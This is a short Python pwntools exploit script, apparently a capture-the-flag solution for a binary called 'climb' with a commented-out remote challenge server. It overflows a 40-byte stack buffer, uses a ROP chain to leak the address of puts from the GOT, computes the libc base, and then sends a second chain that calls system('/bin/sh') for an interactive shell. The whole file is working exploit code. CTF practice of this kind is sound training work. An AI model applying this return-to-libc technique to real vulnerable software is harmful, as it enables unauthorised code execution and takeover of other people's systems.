#!/bin/python

from pwn import *

#p= remote('cha.hackpack.club',41702)
p = process("./climb")
elf = ELF("./climb")
libc = ELF("libc.so.6")

rop = ROP(elf)

PUTS_PLT = elf.plt['puts']
MAIN = elf.symbols['main']
PUTS_GOT = elf.got['puts']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

log.info("Puts@plt: " + hex(PUTS_PLT))
log.info("Puts@glt : " + hex(PUTS_GOT))
log.info("Pop rdi gadget: " + hex(POP_RDI))
log.info("rdi: " + hex(RET))

#Overflow buffer until return address
OFFSET = ("A"*40).encode() #+ "B"*8

# Create rop chain
payload1 = OFFSET
payload1 += p64(POP_RDI)
payload1 += p64(PUTS_GOT)
payload1 += p64(PUTS_PLT)
payload1 += p64(MAIN)

#Send our rop-chain payload
p.recvuntil("How will you respond? ")

p.sendline(payload1)

#Parse leaked address
recieved = p.recvline().strip()
leak =  u64(recieved.ljust(8,b"\x00"))
log.info("Leaked libc address, Puts: %s" % hex(leak))

libc.address = leak - libc.sym["puts"]
log.info("Base address of libc: %s " % hex(libc.address))

BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]

log.info("bin/sh: %s " % hex(BINSH))
log.info("system: %s " % hex(SYSTEM))

payload2 = OFFSET
payload2 += p64(RET)
payload2 += p64(POP_RDI)
payload2 += p64(BINSH)
payload2 += p64(SYSTEM)

p.recvuntil("How will you respond? ")

p.sendline(payload2)

p.interactive()
